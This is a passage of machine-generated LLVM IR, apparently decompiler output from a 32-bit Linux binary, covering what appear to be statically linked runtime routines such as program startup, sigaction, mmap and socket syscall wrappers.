  uselistorder i32 %v1_8054a59, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8054a52, { 1, 0 }
}

define i32 @function_8054a7d(i32 %arg1) local_unnamed_addr {
dec_label_pc_8054a7d:
  ret i32 0
}

define i32 @function_8054a80(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8054a80:
  %v0_8054a80 = load i32, i32* @eax, align 4
  ret i32 %v0_8054a80
}

define i32 @function_8054a81() local_unnamed_addr {
dec_label_pc_8054a81:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %v0_8054a81 = load i32, i32* @esi, align 4
  %v0_8054a82 = load i32, i32* @ebx, align 4
  %v0_8054a86 = load i32, i32* @eax, align 4
  store i32 %v0_8054a86, i32* @esi, align 4
  %v0_8054a88 = load i32, i32* @edx, align 4
  store i32 %v0_8054a88, i32* @ebx, align 4
  %v4_8054a8d = call i32 @function_8052afd(i32 %v0_8054a86, i32 1, i32 %tmp6)
  %v8_8054a95 = icmp eq i32 %v4_8054a8d, -1
  %v1_8054a96 = icmp eq i1 %v8_8054a95, false
  br i1 %v1_8054a96, label %dec_label_pc_8054ab1, label %dec_label_pc_8054a98

dec_label_pc_8054a98:                             ; preds = %dec_label_pc_8054a81
  %v0_8054a9a = load i32, i32* @ebx, align 4
  %v6_8054aa0 = call i32 @function_8052cd2(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8055e8c.237, i32 0, i32 0), i32 %v0_8054a9a)
  %v1_8054aa8 = load i32, i32* @esi, align 4
  %v12_8054aa8 = icmp eq i32 %v6_8054aa0, %v1_8054aa8
  br i1 %v12_8054aa8, label %dec_label_pc_8054ab1, label %dec_label_pc_8054aac

dec_label_pc_8054aac:                             ; preds = %dec_label_pc_8054a98
  %v0_8054aac = call i32 @function_80544b5()
  br label %dec_label_pc_8054ab1

dec_label_pc_8054ab1:                             ; preds = %dec_label_pc_8054a98, %dec_label_pc_8054a81, %dec_label_pc_8054aac
  %v2_8054ab1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_8054a82, i32* @ebx, align 4
  store i32 %v0_8054a81, i32* @esi, align 4
  ret i32 %v2_8054ab1

; uselistorder directives
  uselistorder i32 ()* @function_80544b5, { 3, 2, 1, 4, 0 }
  uselistorder i32 (i8*, i32)* @function_8052cd2, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @function_8052afd, { 2, 3, 9, 8, 7, 6, 5, 4, 1, 0 }
  uselistorder label %dec_label_pc_8054ab1, { 2, 0, 1 }
}

define i32 @function_8054ab5() local_unnamed_addr {
dec_label_pc_8054ab5:
  %v0_8054ab8 = load i8, i8* @global_var_8057310.238, align 16
  %v1_8054ab8 = icmp eq i8 %v0_8054ab8, 0
  %v1_8054abf = icmp eq i1 %v1_8054ab8, false
  br i1 %v1_8054abf, label %dec_label_pc_8054ab5.dec_label_pc_8054af1_crit_edge, label %dec_label_pc_8054ac1

dec_label_pc_8054ab5.dec_label_pc_8054af1_crit_edge: ; preds = %dec_label_pc_8054ab5
  %v0_8054af4.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8054af1

dec_label_pc_8054ac1:                             ; preds = %dec_label_pc_8054ab5
  store i8 1, i8* @global_var_8057310.238, align 16
  store i32 4096, i32* @global_var_8057304.239, align 4
  br label %dec_label_pc_8054af1

dec_label_pc_8054af1:                             ; preds = %dec_label_pc_8054ab5.dec_label_pc_8054af1_crit_edge, %dec_label_pc_8054ac1
  %v0_8054af4 = phi i32 [ %v0_8054af4.pre, %dec_label_pc_8054ab5.dec_label_pc_8054af1_crit_edge ], [ 0, %dec_label_pc_8054ac1 ]
  ret i32 %v0_8054af4

; uselistorder directives
  uselistorder i8 1, { 11, 1, 12, 4, 5, 6, 2, 3, 8, 0, 13, 14, 15, 16, 7, 10, 9 }
  uselistorder i8* @global_var_8057310.238, { 1, 0 }
  uselistorder label %dec_label_pc_8054af1, { 1, 0 }
}

define i32 @function_8054af5(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8054af5:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %tmp39 = call i32 @__decompiler_undefined_function_0()
  %tmp44 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %tmp44, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_80572fc.240, align 4
  store i32 %arg6, i32* @global_var_805730c.236, align 4
  store i32 %arg4, i32* @ebp, align 4
  %v2_8054b2c = mul i32 %arg2, 4
  %v3_8054b2c = add i32 %tmp44, %v2_8054b2c
  store i32 %v3_8054b2c, i32* %edx.global-to-local, align 4
  %v1_8054b2f = add i32 %v3_8054b2c, 4
  store i32 %v1_8054b2f, i32* @global_var_8057300.241, align 256
  %v3_8054b37 = load i32, i32* %arg3, align 4
  %v14_8054b37 = icmp eq i32 %v1_8054b2f, %v3_8054b37
  %v1_8054b39 = icmp eq i1 %v14_8054b37, false
  br i1 %v1_8054b39, label %dec_label_pc_8054b41, label %dec_label_pc_8054b3b

dec_label_pc_8054b3b:                             ; preds = %dec_label_pc_8054af5
  store i32 %v3_8054b2c, i32* @global_var_8057300.241, align 256
  br label %dec_label_pc_8054b41

dec_label_pc_8054b41:                             ; preds = %dec_label_pc_8054af5, %dec_label_pc_8054b3b
  %v0_8054b41 = load i32, i32* @ecx, align 4
  store i32 %v0_8054b41, i32* %stack_var_-160, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v2_8054b46 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8054b4b = bitcast i32* %stack_var_-136 to i8*
  %v4_8054b4b = call i32 @function_805314a(i8* %v3_8054b4b, i32 0, i32 120)
  %v0_8054b50 = load i32, i32* @global_var_8057300.241, align 256
  br label %dec_label_pc_8054b58

dec_label_pc_8054b58:                             ; preds = %dec_label_pc_8054b58, %dec_label_pc_8054b41
  %v0_8054b58 = phi i32 [ %v1_8054b5b, %dec_label_pc_8054b58 ], [ %v0_8054b50, %dec_label_pc_8054b41 ]
  %v1_8054b58 = inttoptr i32 %v0_8054b58 to i32*
  %v2_8054b58 = load i32, i32* %v1_8054b58, align 4
  %v3_8054b58 = icmp eq i32 %v2_8054b58, 0
  %v1_8054b5b = add i32 %v0_8054b58, 4
  %v1_8054b5e = icmp eq i1 %v3_8054b58, false
  br i1 %v1_8054b5e, label %dec_label_pc_8054b58, label %dec_label_pc_8054b7f.preheader

dec_label_pc_8054b7f.preheader:                   ; preds = %dec_label_pc_8054b58
  store i32 %v1_8054b5b, i32* @ebx, align 4
  %v1_8054b7f22 = inttoptr i32 %v1_8054b5b to i32*
  %v2_8054b7f23 = load i32, i32* %v1_8054b7f22, align 4
  %v3_8054b7f24 = icmp eq i32 %v2_8054b7f23, 0
  %v1_8054b8226 = icmp eq i1 %v3_8054b7f24, false
  br i1 %v1_8054b8226, label %dec_label_pc_8054b64.lr.ph, label %dec_label_pc_8054b84

dec_label_pc_8054b64.lr.ph:                       ; preds = %dec_label_pc_8054b7f.preheader
  %v3_8054b44 = ptrtoint i32* %stack_var_-168 to i32
  %v3_8054b6f = add i32 %v3_8054b44, 32
  br label %dec_label_pc_8054b64

dec_label_pc_8054b64:                             ; preds = %dec_label_pc_8054b64.lr.ph, %dec_label_pc_8054b7c
  %v1_8054b6f = phi i32 [ %v2_8054b7f23, %dec_label_pc_8054b64.lr.ph ], [ %v2_8054b7f, %dec_label_pc_8054b7c ]
  %v0_8054b6e = phi i32 [ %v1_8054b5b, %dec_label_pc_8054b64.lr.ph ], [ %v1_8054b7c, %dec_label_pc_8054b7c ]
  %v6_8054b69 = icmp ugt i32 %v1_8054b6f, 14
  br i1 %v6_8054b69, label %dec_label_pc_8054b7c, label %dec_label_pc_8054b6b

dec_label_pc_8054b6b:                             ; preds = %dec_label_pc_8054b64
  %v0_8054b6b = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8054b6b, i32* %stack_var_-160, align 4
  store i32 %v0_8054b6e, i32* %stack_var_-168, align 4
  %v2_8054b6f = mul i32 %v1_8054b6f, 8
  %v4_8054b6f = add i32 %v3_8054b6f, %v2_8054b6f
  %v3_8054b74 = inttoptr i32 %v4_8054b6f to i16*
  %v4_8054b74 = call i32 @function_8055342(i16* %v3_8054b74, i32 %v0_8054b6e, i32 8)
  %v0_8054b7c.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054b7c

dec_label_pc_8054b7c:                             ; preds = %dec_label_pc_8054b64, %dec_label_pc_8054b6b
  %v0_8054b7c = phi i32 [ %v0_8054b6e, %dec_label_pc_8054b64 ], [ %v0_8054b7c.pre, %dec_label_pc_8054b6b ]
  %v1_8054b7c = add i32 %v0_8054b7c, 8
  store i32 %v1_8054b7c, i32* @ebx, align 4
  %v1_8054b7f = inttoptr i32 %v1_8054b7c to i32*
  %v2_8054b7f = load i32, i32* %v1_8054b7f, align 4
  %v3_8054b7f = icmp eq i32 %v2_8054b7f, 0
  %v1_8054b82 = icmp eq i1 %v3_8054b7f, false
  br i1 %v1_8054b82, label %dec_label_pc_8054b64, label %dec_label_pc_8054b84

dec_label_pc_8054b84:                             ; preds = %dec_label_pc_8054b7c, %dec_label_pc_8054b7f.preheader
  store i32 %v2_8054b46, i32* @eax, align 4
  %v0_8054b88 = call i32 @function_80553fd()
  store i32 %v0_8054b88, i32* @eax, align 4
  %v0_8054b8d = call i32 @function_8054ab5()
  %v1_8054b96 = icmp eq i32 %tmp39, 0
  %v1_8054b98 = icmp eq i1 %v1_8054b96, false
  br i1 %v1_8054b98, label %dec_label_pc_8054b9e, label %dec_label_pc_8054b9a

dec_label_pc_8054b9a:                             ; preds = %dec_label_pc_8054b84
  %v1_8054b9a = and i32 %tmp39, -65536
  %v2_8054b9a = or i32 %v1_8054b9a, 4096
  br label %dec_label_pc_8054b9e

dec_label_pc_8054b9e:                             ; preds = %dec_label_pc_8054b84, %dec_label_pc_8054b9a
  %v0_8054b9e = phi i32 [ %tmp39, %dec_label_pc_8054b84 ], [ %v2_8054b9a, %dec_label_pc_8054b9a ]
  store i32 %v0_8054b9e, i32* @global_var_8057304.239, align 4
  %v13_8054ba3 = icmp eq i32 %tmp38, -1
  %v1_8054ba8 = icmp eq i1 %v13_8054ba3, false
  br i1 %v1_8054ba8, label %dec_label_pc_8054bd3, label %dec_label_pc_8054baa

dec_label_pc_8054baa:                             ; preds = %dec_label_pc_8054b9e
  %v0_8054baa = call i32 @function_8055121()
  store i32 %v0_8054baa, i32* @ebx, align 4
  %v0_8054bb1 = call i32 @function_8055090()
  %v0_8054bb6 = load i32, i32* @ebx, align 4
  %v12_8054bb6 = icmp eq i32 %v0_8054bb6, %v0_8054bb1
  %v1_8054bb8 = icmp eq i1 %v12_8054bb6, false
  br i1 %v1_8054bb8, label %dec_label_pc_8054be9, label %dec_label_pc_8054bba

dec_label_pc_8054bba:                             ; preds = %dec_label_pc_8054baa
  %v0_8054bba = call i32 @function_80550b6()
  store i32 %v0_8054bba, i32* @ebx, align 4
  %v0_8054bc1 = call i32 @function_805506a()
  %v0_8054bc6 = load i32, i32* @ebx, align 4
  %v12_8054bc6 = icmp eq i32 %v0_8054bc6, %v0_8054bc1
  %v1_8054bc8 = icmp eq i1 %v12_8054bc6, false
  br i1 %v1_8054bc8, label %dec_label_pc_8054be9, label %dec_label_pc_8054bca.thread

dec_label_pc_8054bca.thread:                      ; preds = %dec_label_pc_8054bba
  br label %dec_label_pc_8054c13

dec_label_pc_8054bd3:                             ; preds = %dec_label_pc_8054b9e
  %v15_8054bd3 = icmp eq i32 %tmp38, %tmp37
  %v1_8054bd7 = icmp eq i1 %v15_8054bd3, false
  br i1 %v1_8054bd7, label %dec_label_pc_8054be9, label %dec_label_pc_8054bd9

dec_label_pc_8054bd9:                             ; preds = %dec_label_pc_8054bd3
  br label %dec_label_pc_8054be9

dec_label_pc_8054be9:                             ; preds = %dec_label_pc_8054bd9, %dec_label_pc_8054bd3, %dec_label_pc_8054bba, %dec_label_pc_8054baa
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8054bf0 = call i32 @function_8054a81()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8054bff = call i32 @function_8054a81()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8054c0e = call i32 @function_8054a81()
  br label %dec_label_pc_8054c13

dec_label_pc_8054c13:                             ; preds = %dec_label_pc_8054bca.thread, %dec_label_pc_8054be9
  store i32 ptrtoint (i32* @global_var_80571a4.233 to i32), i32* %esi.global-to-local, align 4
  %v0_8054c18 = load i32, i32* @edi, align 4
  %v1_8054c18 = inttoptr i32 %v0_8054c18 to i32*
  %v2_8054c18 = load i32, i32* %v1_8054c18, align 4
  store i32 %v2_8054c18, i32* bitcast (i32** @global_var_8057228.243 to i32*), align 8
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80571a4.233 to i32), i32 -134574500), i32 2), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_8057308.235, align 8
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80571a4.233 to i32), i32 -134574500), i32 2), i32 0), label %dec_label_pc_8054c38, label %dec_label_pc_8054c44

dec_label_pc_8054c38:                             ; preds = %dec_label_pc_8054c13, %dec_label_pc_8054c38
  %v4_8054c38 = phi i32 [ %v1_8054c3f, %dec_label_pc_8054c38 ], [ 0, %dec_label_pc_8054c13 ]
  store i32 ptrtoint (i32* @global_var_8054c3f.244 to i32), i32* %stack_var_-160, align 4
  %v5_8054c38 = mul i32 %v4_8054c38, 4
  %v6_8054c38 = add i32 %v5_8054c38, ptrtoint (i32* @global_var_80571a4.233 to i32)
  %v7_8054c38 = inttoptr i32 %v6_8054c38 to i32*
  %v8_8054c38 = load i32, i32* %v7_8054c38, align 4
  call void @__pseudo_call(i32 %v8_8054c38)
  %v0_8054c3f = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054c3f = add i32 %v0_8054c3f, 1
  store i32 %v1_8054c3f, i32* %ebx.global-to-local, align 4
  %v1_8054c40 = load i32, i32* %esi.global-to-local, align 4
  %v7_8054c40 = icmp ult i32 %v1_8054c3f, %v1_8054c40
  br i1 %v7_8054c40, label %dec_label_pc_8054c38, label %dec_label_pc_8054c44

dec_label_pc_8054c44:                             ; preds = %dec_label_pc_8054c38, %dec_label_pc_8054c13
  store i32 134564938, i32* %stack_var_-160, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80571a4.233 to i32), i32 -134574500), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80571a4.233 to i32), i32 -134574500), i32 2), i32 0), label %dec_label_pc_8054c5c, label %dec_label_pc_8054c68

dec_label_pc_8054c5c:                             ; preds = %dec_label_pc_8054c44, %dec_label_pc_8054c5c
  %v4_8054c5c = phi i32 [ %v1_8054c63, %dec_label_pc_8054c5c ], [ 0, %dec_label_pc_8054c44 ]
  store i32 ptrtoint (i32* @global_var_8054c63.245 to i32), i32* %stack_var_-160, align 4
  %v5_8054c5c = mul i32 %v4_8054c5c, 4
  %v6_8054c5c = add i32 %v5_8054c5c, ptrtoint (i32* @global_var_80571a4.233 to i32)
  %v7_8054c5c = inttoptr i32 %v6_8054c5c to i32*
  %v8_8054c5c = load i32, i32* %v7_8054c5c, align 4
  call void @__pseudo_call(i32 %v8_8054c5c)
  %v0_8054c63 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054c63 = add i32 %v0_8054c63, 1
  store i32 %v1_8054c63, i32* %ebx.global-to-local, align 4
  %v1_8054c64 = load i32, i32* %esi.global-to-local, align 4
  %v7_8054c64 = icmp ult i32 %v1_8054c63, %v1_8054c64
  br i1 %v7_8054c64, label %dec_label_pc_8054c5c, label %dec_label_pc_8054c68

dec_label_pc_8054c68:                             ; preds = %dec_label_pc_8054c5c, %dec_label_pc_8054c44
  %v0_8054c71 = load i32, i32* %stack_var_-160, align 4
  %v1_8054c71 = call i32 @function_80530f9(i32 %v0_8054c71)
  %v1_8054c76 = inttoptr i32 %v1_8054c71 to i32*
  store i32 0, i32* %v1_8054c76, align 4
  store i32 0, i32* @eax, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v0_8054c97 = load i32, i32* @edi, align 4
  store i32 %v0_8054c97, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %arg1)
  %v0_8054ca6 = load i32, i32* @eax, align 4
  %v1_8054ca9 = call i32 @function_8054709(i32 %v0_8054ca6)
  %v0_8054cb5 = load i32, i32* @ebx, align 4
  %v1_8054cb5 = inttoptr i32 %v0_8054cb5 to %sigcontext*
  %v2_8054cb5 = call i32 @sigreturn(%sigcontext* %v1_8054cb5)
  %v0_8054cbd = load i32, i32* @ebx, align 4
  %v1_8054cbd = inttoptr i32 %v0_8054cbd to %sigcontext*
  %v2_8054cbd = call i32 @sigreturn(%sigcontext* %v1_8054cbd)
  ret i32 %v2_8054cbd

; uselistorder directives
  uselistorder i32 %v1_8054c63, { 1, 2, 0 }
  uselistorder i32 %v1_8054c3f, { 1, 2, 0 }
  uselistorder i32 %v2_8054b7f, { 1, 0 }
  uselistorder i32 %v1_8054b7c, { 2, 1, 0 }
  uselistorder i32 %v1_8054b5b, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8054b58, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @function_8054709, { 0, 2, 1 }
  uselistorder i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80571a4.233 to i32), i32 -134574500), i32 2), i32 0), { 1, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80571a4.233 to i32), i32 -134574500), i32 2), { 1, 3, 4, 2, 0 }
  uselistorder i32 ()* @function_8054a81, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 -65536, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9 }
  uselistorder i32 120, { 8, 22, 1, 2, 9, 10, 3, 11, 12, 13, 4, 5, 14, 15, 6, 16, 17, 7, 18, 19, 20, 21, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_8054c5c, { 1, 0 }
  uselistorder label %dec_label_pc_8054c38, { 1, 0 }
  uselistorder label %dec_label_pc_8054c13, { 1, 0 }
  uselistorder label %dec_label_pc_8054b9e, { 1, 0 }
  uselistorder label %dec_label_pc_8054b7c, { 1, 0 }
  uselistorder label %dec_label_pc_8054b64, { 1, 0 }
  uselistorder label %dec_label_pc_8054b41, { 1, 0 }
}

define i32 @function_8054cbf(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8054cbf:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_8054cbf = load i32, i32* @esi, align 4
  %v0_8054cc0 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8054cd5 = icmp eq i32* %arg2, null
  br i1 %v1_8054cd5, label %dec_label_pc_8054d28, label %dec_label_pc_8054cd9

dec_label_pc_8054cd9:                             ; preds = %dec_label_pc_8054cbf
  %v2_8054cd9 = load i32, i32* %arg2, align 4
  store i32 %v2_8054cd9, i32* %stack_var_-148, align 4
  %v1_8054ce2 = add i32 %tmp11, 4
  %v3_8054cf4 = bitcast i32* %stack_var_-136 to i16*
  %v4_8054cf4 = call i32 @function_8055342(i16* %v3_8054cf4, i32 %v1_8054ce2, i32 128)
  %v1_8054cf9 = add i32 %tmp11, 132
  %v2_8054d13 = inttoptr i32 %v1_8054cf9 to i8*
  %v3_8054d13 = load i8, i8* %v2_8054d13, align 1
  %v4_8054d13 = and i8 %v3_8054d13, 4
  %v5_8054d13 = icmp eq i8 %v4_8054d13, 0
  %v1_8054d1a = icmp eq i1 %v5_8054d13, false
  br i1 %v1_8054d1a, label %dec_label_pc_8054d28, label %dec_label_pc_8054d1c

dec_label_pc_8054d1c:                             ; preds = %dec_label_pc_8054cd9
  br label %dec_label_pc_8054d28

dec_label_pc_8054d28:                             ; preds = %dec_label_pc_8054d1c, %dec_label_pc_8054cd9, %dec_label_pc_8054cbf
  %v1_8054d2a = icmp eq i32 %arg3, 0
  br i1 %v1_8054d2a, label %dec_label_pc_8054d32, label %dec_label_pc_8054d2e

dec_label_pc_8054d2e:                             ; preds = %dec_label_pc_8054d28
  %v2_8054d2e = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_8054d32

dec_label_pc_8054d32:                             ; preds = %dec_label_pc_8054d28, %dec_label_pc_8054d2e
  %v0_8054d41 = phi i32 [ 0, %dec_label_pc_8054d28 ], [ %v2_8054d2e, %dec_label_pc_8054d2e ]
  br i1 %v1_8054cd5, label %dec_label_pc_8054d3f, label %dec_label_pc_8054d38

dec_label_pc_8054d38:                             ; preds = %dec_label_pc_8054d32
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_8054d3f

dec_label_pc_8054d3f:                             ; preds = %dec_label_pc_8054d32, %dec_label_pc_8054d38
  %v0_8054d42 = phi %sigaction* [ null, %dec_label_pc_8054d32 ], [ %phitmp, %dec_label_pc_8054d38 ]
  %v5_8054d4a = call i32 @function_8054de5(i32 %arg1, %sigaction* %v0_8054d42, i32 %v0_8054d41, i32 8)
  store i32 %v5_8054d4a, i32* %ebx.global-to-local, align 4
  br i1 %v1_8054d2a, label %dec_label_pc_8054d8d, label %dec_label_pc_8054d58

dec_label_pc_8054d58:                             ; preds = %dec_label_pc_8054d3f
  %v2_8054d58 = icmp slt i32 %v5_8054d4a, 0
  br i1 %v2_8054d58, label %dec_label_pc_8054d8d, label %dec_label_pc_8054d5c

dec_label_pc_8054d5c:                             ; preds = %dec_label_pc_8054d58
  %v3_8054d5c = load i32, i32* %stack_var_-288, align 4
  %v2_8054d60 = inttoptr i32 %arg3 to i32*
  store i32 %v3_8054d5c, i32* %v2_8054d60, align 4
  %v2_8054d68 = ptrtoint i32* %stack_var_-276 to i32
  %v1_8054d6d = add i32 %arg3, 4
  %v3_8054d71 = inttoptr i32 %v1_8054d6d to i16*
  %v4_8054d71 = call i32 @function_8055342(i16* %v3_8054d71, i32 %v2_8054d68, i32 128)
  %v2_8054d7a = add i32 %arg3, 132
  %v3_8054d7a = inttoptr i32 %v2_8054d7a to i32*
  %v2_8054d87 = add i32 %arg3, 136
  %v3_8054d87 = inttoptr i32 %v2_8054d87 to i32*
  %v0_8054d8d.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054d8d

dec_label_pc_8054d8d:                             ; preds = %dec_label_pc_8054d58, %dec_label_pc_8054d3f, %dec_label_pc_8054d5c
  %v0_8054d8d = phi i32 [ %v5_8054d4a, %dec_label_pc_8054d58 ], [ %v5_8054d4a, %dec_label_pc_8054d3f ], [ %v0_8054d8d.pre, %dec_label_pc_8054d5c ]
  store i32 %v0_8054cc0, i32* @ebx, align 4
  store i32 %v0_8054cbf, i32* @esi, align 4
  ret i32 %v0_8054d8d

; uselistorder directives
  uselistorder i32 136, { 1, 0, 2 }
  uselistorder i8 4, { 3, 4, 1, 2, 5, 6, 0 }
  uselistorder i32 132, { 1, 2, 0, 3 }
  uselistorder i32 128, { 6, 7, 11, 8, 10, 0, 1, 2, 3, 4, 5, 9 }
  uselistorder i32* null, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9 }
  uselistorder i32 %arg3, { 0, 3, 1, 2, 4, 5 }
  uselistorder label %dec_label_pc_8054d8d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054d3f, { 1, 0 }
  uselistorder label %dec_label_pc_8054d32, { 1, 0 }
}

define i32 @function_8054d98(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8054d98:
  %stack_var_4 = alloca i32, align 4
  %v0_8054d98 = load i32, i32* @ebx, align 4
  store i32 %v0_8054d98, i32* @edx, align 4
  %v2_8054da3 = load i32, i32* @ecx, align 4
  %v4_8054da3 = load i32, i32* @esi, align 4
  %v5_8054da3 = load i32, i32* @edi, align 4
  %v6_8054da3 = load i32, i32* @ebp, align 4
  %v7_8054da3 = call i32* @mmap(i32* nonnull %stack_var_4, i32 %v2_8054da3, i32 %v0_8054d98, i32 %v4_8054da3, i32 %v5_8054da3, i32 %v6_8054da3)
  %v8_8054da3 = ptrtoint i32* %v7_8054da3 to i32
  store i32 %v0_8054d98, i32* @ebx, align 4
  %v3_8054dac = icmp ugt i32* %v7_8054da3, inttoptr (i32 -4096 to i32*)
  call void @__pseudo_cond_branch(i1 %v3_8054dac, i32 134566981)
  ret i32 %v8_8054da3

; uselistorder directives
  uselistorder i32* @ebp, { 7, 68, 69, 70, 71, 72, 73, 74, 75, 32, 33, 34, 35, 76, 77, 78, 79, 80, 81, 82, 83, 88, 84, 85, 86, 87, 6, 89, 10, 2, 21, 22, 11, 29, 15, 8, 14, 16, 18, 1, 23, 9, 0, 28, 12, 13, 17, 19, 20, 24, 25, 26, 27, 30, 31, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 3, 47, 48, 49, 50, 4, 51, 52, 53, 54, 55, 56, 57, 58, 59, 5, 60, 61, 62, 63, 64, 65, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 110, 108, 109, 111, 112, 113, 114, 115, 66, 67 }
  uselistorder i32* @ecx, { 5, 18, 16, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0, 41, 42, 43, 1, 44, 20, 19, 17, 45, 46, 47, 2, 48, 49, 50, 3, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 7, 8, 4, 9, 10, 11, 62, 12, 13, 14, 15, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 6, 88, 89, 90, 91, 92 }
}

define i32 @function_8054db3(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8054db3:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054db3 = load i32, i32* @ebx, align 4
  store i32 %v0_8054db3, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8054dc6 = call i32 @int80_syscall(i32 102)
  store i32 %v1_8054dc6, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_8054dc6, -4095
  br i1 %tmp9, label %dec_label_pc_8054ddf, label %dec_label_pc_8054dd3

dec_label_pc_8054dd3:                             ; preds = %dec_label_pc_8054db3
  %v1_8054dd3 = call i32 @function_80530f9(i32 %v0_8054db3)
  %v0_8054dd8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054dd8 = sub i32 0, %v0_8054dd8
  %v2_8054dda = inttoptr i32 %v1_8054dd3 to i32*
  store i32 %v1_8054dd8, i32* %v2_8054dda, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8054de3.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054ddf

dec_label_pc_8054ddf:                             ; preds = %dec_label_pc_8054db3, %dec_label_pc_8054dd3
  %v2_8054de3 = phi i32 [ %v0_8054db3, %dec_label_pc_8054db3 ], [ %v2_8054de3.pre, %dec_label_pc_8054dd3 ]
  %v0_8054ddf = phi i32 [ %v1_8054dc6, %dec_label_pc_8054db3 ], [ -1, %dec_label_pc_8054dd3 ]
  %v2_8054de1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054de1, i32* @edx, align 4
  store i32 %v2_8054de3, i32* @ebx, align 4
  ret i32 %v0_8054ddf

; uselistorder directives
  uselistorder i32 %v1_8054dc6, { 1, 0, 2 }
  uselistorder i32 102, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_8054ddf, { 1, 0 }
}

define i32 @function_8054de5(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8054de5:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_8054de6 = load i32, i32* @esi, align 4
  store i32 %v0_8054de6, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8054dfa = load i32, i32* @ebx, align 4
  %v7_8054e02 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
